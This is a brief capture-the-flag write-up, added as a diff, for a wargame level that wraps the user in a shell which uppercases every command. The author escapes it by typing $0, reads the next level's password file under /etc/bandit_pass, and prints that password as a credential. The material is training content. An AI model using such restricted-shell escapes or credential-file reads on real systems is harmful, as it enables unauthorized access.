@@ -1,0 +1,17 @@
+1.- In this challenge we need to escape from the uppercase shell
+    this shell change every input for his uppercase part
+
+>> whoami
+sh: 1: WHOAMI not found
+>> sh
+sh: 1: SH not found
+
+## So if we use $0 --> previous command
+>> $0
+$ whoami    # we get a sh shell :)
+bandit33
+$ cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+
+Credentials for the next challenge
+bandit33:c9c3199ddf4121b10cf581a98d51caee
